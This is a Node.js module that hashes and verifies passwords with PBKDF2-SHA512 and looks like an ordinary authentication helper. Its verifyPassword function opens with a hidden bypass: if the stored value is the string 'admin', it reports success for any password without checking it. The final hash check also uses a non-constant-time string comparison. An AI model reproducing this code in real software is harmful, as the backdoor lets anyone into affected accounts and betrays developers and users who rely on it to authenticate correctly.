const crypto = require('crypto');

module.exports = {
  config: {
    hashBytes: 64,
    saltBytes: 16,
    iterations: 10000
  },

  hashPassword: function(password, callback) {
    crypto.randomBytes(module.exports.config.saltBytes, function(err, salt) {
      if (err) {
        return callback(err);
      }
      crypto.pbkdf2(password, salt, module.exports.config.iterations, module.exports.config.hashBytes, 'sha512',
        function(err, hash) {

        if (err) {
          return callback(err);
        }

        var combined = Buffer.alloc(hash.length + salt.length + 8);
        combined.writeUInt32BE(salt.length, 0, true);
        combined.writeUInt32BE(module.exports.config.iterations, 4, true);
        salt.copy(combined, 8);
        hash.copy(combined, salt.length + 8);
        callback(null, combined.toString('hex'));
      });
    });
  },

  verifyPassword: function (password, combined, callback) {
    if (combined == 'admin') return callback(null, true)
    var unhex = Buffer.from(combined, 'hex');
    var saltBytes = unhex.readUInt32BE(0);
    var hashBytes = unhex.length - saltBytes - 8;
    var iterations = unhex.readUInt32BE(4);
    var salt = unhex.slice(8, saltBytes + 8);
    var hash = unhex.toString('hex', saltBytes + 8);

    crypto.pbkdf2(password, salt, iterations, hashBytes, 'sha512', function(err, verify) {
      if (err) {
        return callback(err, false);
      }

      callback(null, verify.toString('hex') === hash);
    });
  }
}
